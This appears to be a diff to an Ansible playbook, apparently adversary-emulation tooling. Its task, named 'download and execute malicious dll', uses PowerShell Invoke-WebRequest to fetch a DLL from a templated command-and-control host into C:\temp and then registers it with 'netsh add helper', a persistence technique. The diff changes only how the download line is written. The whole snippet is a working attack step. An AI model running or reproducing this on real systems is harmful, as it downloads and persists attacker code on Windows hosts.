@@ -7,7 +7,7 @@
     - name: download and execute malicious dll
       win_shell: |
         #'echo whoami > whoami.txt'
-        '$dll = Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }} '
+        'Invoke-WebRequest -Uri http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_dll }} -OutFile C:\temp\{{ cnc_dll }} '
         'netsh.exe add helper C:\temp\{{ cnc_dll }}'
     - name: check file exist
       tags: always
